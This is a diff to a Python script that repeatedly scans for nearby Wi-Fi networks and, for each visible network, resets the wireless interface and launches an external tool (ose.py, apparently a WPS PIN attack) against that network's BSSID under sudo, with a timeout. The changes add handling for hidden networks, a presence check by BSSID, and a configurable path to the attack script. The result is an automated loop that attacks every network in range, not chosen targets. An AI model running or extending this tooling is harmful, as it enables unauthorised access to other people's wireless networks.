@@ -9,10 +9,14 @@ import time
 INTERFACE = os.getenv("INTERFACE")
 TIMEOUT = 30
 
+PATH = os.getenv("absolute_path")
+
 def scan(interface: str, rescan: bool=True):
     print("Scanning...")
-    nmcli.device.wifi_rescan(ifname=interface)
-    return nmcli.device.wifi(ifname=interface, rescan=rescan)
+    while nmcli.device.wifi(ifname=interface) == []:
+        nmcli.device.wifi_rescan(ifname=interface)
+    print("Scan complete\n")
+    return nmcli.device.wifi(ifname=interface)
 
 
 def main_loop():
@@ -45,16 +49,29 @@ def main_loop():
                 networks_new = scan(INTERFACE, True)
                 last_scan = time.time()
 
-            if not network in networks_new:
+            if ssid == "(no name)":
+                print("Hidden network, skipping...\n")
+                continue
+
+            # check if the network is still there
+            network_present = False
+            for n in networks_new:
+                if network.bssid == n.bssid:
+                    network_present = True
+                    break
+
+            if network_present == False:
                 print("Network not found, skipping...\n")
                 continue
+            else:
+                print("Network present\n")
             
             # The interface should always restart before running the attack
             subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
             subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
             subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)
 
-            subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
+            subprocess.run(f"timeout {TIMEOUT} sudo {PATH}/.scripts/ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
 
 
 if __name__ == "__main__":
